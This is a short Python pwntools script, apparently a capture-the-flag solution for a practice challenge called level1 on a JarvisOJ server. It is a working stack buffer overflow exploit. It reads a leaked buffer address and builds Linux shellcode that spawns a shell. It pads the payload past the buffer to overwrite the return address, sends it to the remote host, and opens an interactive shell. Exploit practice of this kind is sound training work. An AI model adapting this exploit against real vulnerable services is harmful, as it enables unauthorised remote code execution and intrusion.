#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *
context(log_level = 'debug', arch = 'i386', os = 'linux')

shellcode = asm(shellcraft.sh())
#  io = process('../elf/level1')
io = remote('pwn2.jarvisoj.com', 9877)
text = io.recvline()[14: -2]
#  print text[14:-2]
buf_addr = int(text, 16)

payload = shellcode + 'a' * (0x88 + 0x4 - len(shellcode)) + p32(buf_addr)
io.send(payload)
io.interactive()
io.close()
